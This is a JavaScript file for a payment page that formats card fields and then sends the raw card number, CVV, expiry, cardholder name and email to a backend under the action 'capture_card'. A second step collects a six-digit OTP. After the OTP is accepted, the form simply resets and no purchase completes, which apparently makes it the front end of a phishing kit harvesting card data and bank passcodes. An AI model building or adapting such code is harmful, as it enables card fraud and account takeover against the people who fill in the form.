// Format card number with spaces
document.getElementById('cardNumber')?.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
    e.target.value = formattedValue.slice(0, 19);
});

// Format expiry date
document.getElementById('expiryDate')?.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    e.target.value = value;
});

// Format CVV
document.getElementById('cvv')?.addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
});

// Format OTP
document.getElementById('otpCode')?.addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
});

// Handle payment form submission
document.getElementById('paymentForm')?.addEventListener('submit', async function(e) {
    e.preventDefault();

    const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
    const expiryDate = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvv').value;
    const cardholderName = document.getElementById('cardholderName').value;
    const email = document.getElementById('email').value;

    // Basic validation
    if (cardNumber.length !== 16) {
        showError('Please enter a valid 16-digit card number');
        return;
    }

    if (!expiryDate.match(/^\d{2}\/\d{2}$/)) {
        showError('Please enter expiry date in MM/YY format');
        return;
    }

    if (cvv.length < 3) {
        showError('Please enter a valid CVV');
        return;
    }

    // Disable button and show loading
    const submitBtn = document.getElementById('submitBtn');
    submitBtn.classList.add('loading');
    submitBtn.disabled = true;

    try {
        const response = await fetch('api.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({
                action: 'capture_card',
                cardNumber: cardNumber,
                expiryDate: expiryDate,
                cvv: cvv,
                cardholderName: cardholderName,
                email: email
            })
        });

        const result = await response.json();

        if (result.success) {
            // Store sessionId for OTP verification
            window.currentSessionId = result.sessionId;
            window.currentEmail = email;

            // Show success and move to OTP
            document.getElementById('successMessage').style.display = 'block';
            document.getElementById('paymentForm').style.display = 'none';

            setTimeout(() => {
                document.getElementById('paymentForm').parentElement.style.display = 'none';
                document.getElementById('otpSection').style.display = 'block';
                document.getElementById('successMessage').style.display = 'none';
            }, 2000);
        } else {
            showError(result.message || 'An error occurred. Please try again.');
        }
    } catch (error) {
        showError('Network error. Please check your connection and try again.');
        console.error('Error:', error);
    } finally {
        submitBtn.classList.remove('loading');
        submitBtn.disabled = false;
    }
});

// Handle OTP form submission
document.getElementById('otpForm')?.addEventListener('submit', async function(e) {
    e.preventDefault();

    const otpCode = document.getElementById('otpCode').value;
    const sessionId = window.currentSessionId;

    if (!sessionId) {
        showOtpError('Session expired. Please start over.');
        return;
    }

    if (otpCode.length !== 6) {
        showOtpError('Please enter a 6-digit code');
        return;
    }

    const form = document.getElementById('otpForm');
    const buttons = form.querySelectorAll('button');
    buttons.forEach(btn => {
        btn.classList.add('loading');
        btn.disabled = true;
    });

    try {
        const response = await fetch('api.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({
                action: 'verify_otp',
                sessionId: sessionId,
                otpCode: otpCode
            })
        });

        const result = await response.json();

        if (result.success) {
            document.getElementById('otpForm').style.display = 'none';
            document.getElementById('otpSuccessMessage').style.display = 'block';

            setTimeout(() => {
                resetForm();
            }, 3000);
        } else {
            showOtpError(result.message || 'Invalid code. Please try again.');
        }
    } catch (error) {
        showOtpError('Network error. Please try again.');
        console.error('Error:', error);
    } finally {
        buttons.forEach(btn => {
            btn.classList.remove('loading');
            btn.disabled = false;
        });
    }
});

function showError(message) {
    const errorDiv = document.getElementById('errorMessage');
    document.getElementById('errorText').textContent = message;
    errorDiv.style.display = 'block';
    setTimeout(() => {
        errorDiv.style.display = 'none';
    }, 5000);
}

function showOtpError(message) {
    const errorDiv = document.getElementById('otpErrorMessage');
    document.getElementById('otpErrorText').textContent = message;
    errorDiv.style.display = 'block';
    setTimeout(() => {
        errorDiv.style.display = 'none';
    }, 5000);
}

function resetForm() {
    document.getElementById('paymentForm').reset();
    document.getElementById('otpForm').reset();
    document.getElementById('otpSection').style.display = 'none';
    document.getElementById('paymentForm').parentElement.style.display = 'block';
    document.getElementById('paymentForm').style.display = 'block';
    document.getElementById('successMessage').style.display = 'none';
    document.getElementById('otpSuccessMessage').style.display = 'none';
    window.currentSessionId = null;
    window.currentEmail = null;
}
